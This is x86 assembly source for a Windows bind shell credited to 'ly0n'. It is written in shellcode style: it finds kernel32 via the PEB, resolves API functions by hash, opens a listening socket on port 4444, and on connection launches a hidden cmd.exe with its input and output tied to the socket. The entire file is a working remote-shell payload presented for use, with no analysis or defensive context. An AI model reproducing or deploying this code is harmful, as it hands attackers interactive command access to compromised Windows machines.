    .386
    .model flat,stdcall

    .data
    .code
    start:
    assume fs:nothing

    ; —————————————————————————
    ; OW bind shell by ly0n
    ; —————————————————————————

    ; —————————————————————————
    ; Loading libs&funcs
    ; —————————————————————————

    ; getmodulehandlea hash: 48269992h
    ; getprocaddress hash: E553E06Fh

    call find_kernel32
    mov ebp, eax

    mov ebx, 0E553E06Fh ; getprocaddr
    call find_function_kernel32
    push eax
    mov ebx, 48269992h; get module handler
    call find_function_kernel32
    pop ebx ; getmodulehandle in edx, getprocaddr in eax
    push 00000000h ; kernel32.dll
    push 6c6c642eh
    push 32336c65h
    push 6e72656bh
    mov esi, esp
    push eax ; save getmodulehandle
    push esi
    call eax
    ; getprocaddr in ebx, kernel32 handler in eax
    mov ebp, eax ; save handle in ebp
    ; allocate space for function addr
    mov ecx, 0198h
    allocate:
    push 0h
    loop allocate

    mov edi, esp
    nop

    push 00004173h ; CreateProcessA
    push 7365636fh
    push 72506574h
    push 61657243h
    call add_func_array
    push 00737365h ; ExitProcess
    push 636f7250h
    push 74697845h
    call add_func_array
    push 00000000h ;LoadLibraryA
    push 41797261h
    push 7262694ch
    push 64616f4ch
    call add_func_array
    ; ————————–
    ; Load winsock
    ; ————————–
    push 00006c6ch ; winsock lib
    push 642e3233h
    push 5f327357h
    mov esi, esp
    push esi
    call dword ptr [edi – 04h]
    push esi
    call dword ptr [edi + 654h] ; handle in eax, getprocaddr in ebx
    mov ebp, eax
    ; ————————
    ;  Load winsock funcs
    ; ————————
    push 00007075h ; WsaStartup
    push 74726174h
    push 53415357h
    call add_func_array
    push 00004174h ; WsaSpcletA
    push 656b636fh
    push 53415357h
    call add_func_array
    push 00000000h ; bind
    push 646e6962h
    call add_func_array
    push 00006e65h ; listen
    push 7473696ch
    call add_func_array
    push 00007470h ; accept
    push 65636361h
    call add_func_array

    mov ecx, edi
    add ecx, 8h
    mov [edi], ecx
    add edi, 4h
    add ecx, 110h
    mov [edi], ecx

    ; ————————————————
    ;  Main part of code
    ; ————————————————

    nop
    push dword ptr [edi – 4h] ; WSASTARTUP
    push 90h
    call dword ptr [edi – 18h]

    push 0h ; WSASOCKETA create socket
    push 0h
    push 0h
    push 0h
    push 1h
    push 2h
    call dword ptr[edi – 014h]

    mov ebp, eax ; socket file descriptor

    push 0h
    push 0h
    push 0h

    mov ebx, 5c110003h ; AF_INET: 2 PORT: 4444
    dec ebx
    push ebx
    mov ebx, esp
    push 010h ; namelen 16
    push ebx
    push eax
    call dword ptr ds:[edi – 010h]

    push 0h
    push ebp
    call dword ptr ds:[edi – 0Ch]
    nop

    mov ecx, 4h
    fbuff:
    push 0
    loop fbuff
    mov ebx, esp
    push 10h
    mov esp, esi
    push esi
    push ebx
    push ebp
    call dword ptr ds:[edi – 08h]

    nop
    mov ebp, eax

    mov esi, edi
    add esi, 14h
    mov dword ptr [esi], 44h ; size of struct
    mov dword ptr[esi + 2ch], 101h ; use handles & hide window P-)
    mov dword ptr [esi + 38h], ebp ; file descriptors in struct
    mov dword ptr [esi + 3Ch], ebp
    mov dword ptr [esi + 40h], ebp

    push 00646d63h
    mov ebp, esp

    add esi, 44h
    push esi
    sub esi, 44h
    push esi
    push 0h
    push 0h
    push 0h
    push 1h
    push 0h
    push 0h
    push ebp
    push 0h
    call dword ptr ds:[edi – 24h]

    call dword ptr ds:[edi – 20h]

    ; ————————————————
    ;  Custom functions used
    ; ————————————————

    ; add func to array
    add_func_array:
    mov esi, esp
    add esi, 4h
    push esi
    push ebp
    call ebx
    nop
    mov [edi], eax
    add edi, 4h
    ret

    ;find kernel 32
    find_kernel32:
    push esi ;save esi reg
    xor eax, eax ; 0 eax
    mov eax, fs:[eax+30h] ; peb
    mov eax, [eax + 0ch] ; calculate addr
    mov esi, [eax + 1ch] ;
    lodsd ; calculo
    mov eax, [eax + 8h] ; eax = kernel32 base addr
    pop esi ; restore esi
    ret ; ret with base addr

    ;search func by hash
    find_function_kernel32:
    xor ecx,ecx
    mov edi,dword ptr ss:[ebp+3ch] ; search in memory
    mov edi,dword ptr ss:[ebp+edi+78h]
    add edi,ebp
    next_function_pointer:
    mov edx,dword ptr ds:[edi+20h]
    add edx,ebp
    mov esi,dword ptr ds:[edx+ecx*4]
    add esi,ebp
    xor eax,eax
    cdq
    hash_next_byte:
    lods byte ptr ds:[esi]
    ror edx,0dh
    add edx,eax
    test al,al
    jnz short hash_next_byte
    inc ecx
    cmp edx,ebx
    jnz short next_function_pointer
    dec ecx
    mov ebx,dword ptr ds:[edi+24h] ; obtain dir
    add ebx,ebp
    mov cx,word ptr ds:[ebx+ecx*2h]
    mov ebx,dword ptr ds:[edi+1ch]
    add ebx,ebp
    mov eax,dword ptr ds:[ebx+ecx*4h]
    add eax,ebp
    ret

    end start